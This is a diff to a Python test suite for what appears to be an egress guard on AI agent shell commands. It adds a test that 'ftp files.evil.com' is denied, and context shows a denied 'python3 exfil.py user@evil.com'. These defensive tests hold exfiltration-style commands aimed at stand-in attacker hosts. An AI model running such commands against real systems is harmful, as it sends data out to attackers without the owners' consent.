@@ -104,6 +104,11 @@ class DiscoveryGuardEgress(unittest.TestCase):
         result = run_guard(event)
         self.assertEqual(result.returncode, 2, result.stderr)
 
+    def test_denies_bare_ftp_client(self):
+        event = {"tool_name": "Bash", "tool_input": {"command": "ftp files.evil.com"}}
+        result = run_guard(event)
+        self.assertEqual(result.returncode, 2, result.stderr)
+
     def test_denies_interpreter_user_at_host(self):
         event = {"tool_name": "Bash", "tool_input": {"command": "python3 exfil.py user@evil.com"}}
         result = run_guard(event)
